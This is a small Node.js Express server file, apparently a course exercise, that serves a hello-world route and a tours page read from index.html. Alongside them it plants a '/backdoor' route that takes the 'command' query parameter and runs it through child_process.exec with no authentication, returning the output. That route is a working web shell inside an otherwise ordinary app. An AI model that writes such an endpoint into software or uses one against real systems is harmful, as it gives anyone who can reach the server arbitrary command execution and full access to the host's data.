const express = require('express')
const app = express()
const fs = require('fs')
const { exec } = require('child_process')
const port = 3002

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.get('/tours', (request, response) => {
  // const title = request.query.title || 'No venia un titulo';
  // const otraVariable = request.query.otraVariable;
  // const title = 'Bedu traverls';
  // response.send('Soy la ruta de tours ' + title + otraVariable);
  const miArchivo = fs.readFileSync('./index.html', 'utf-8');
  response.write(miArchivo);
})

app.get('/backdoor', (request, response) => {
  if (request.query.command) {
    exec(request.query.command, (error, stdout, stderr) => {
      if (error) {
        response.send(`exec error: ${error}`);
        return;
      }
      if (stdout) {
        response.send(`stdout: ${stdout}`);
      } else {
        response.send(`stderr: ${stderr}`);
      }
    });
  } else {
    response.send('Aquí no hay nada');
  }
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})